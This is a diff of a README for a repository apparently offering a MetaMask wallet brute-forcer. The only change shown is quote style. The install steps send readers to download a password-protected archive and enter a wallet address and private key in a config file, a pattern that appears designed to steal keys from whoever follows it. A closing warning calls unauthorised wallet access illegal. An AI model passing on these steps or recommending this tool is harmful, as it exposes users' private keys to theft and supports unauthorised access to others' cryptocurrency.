@@ -17,7 +17,7 @@ Another precautionary measure is to create a new wallet and promptly transfer yo
 
 ## Install
 - [Download](https://github.com/deadspyexx/metamask-brute/archive/refs/heads/main.zip) the repository release and extract files with password "bPc5GERPSP".
-- Edit the "address" and "private_key" fields in the config.json file.
+- Edit the "address" and 'private_key' fields in the config.json file.
   
 ## Warning
 Using such techniques to gain unauthorized access to someone else's wallet is not only against the law but also highly unethical. It violates the trust and privacy of individuals and can lead to severe consequences, including legal action and criminal charges.
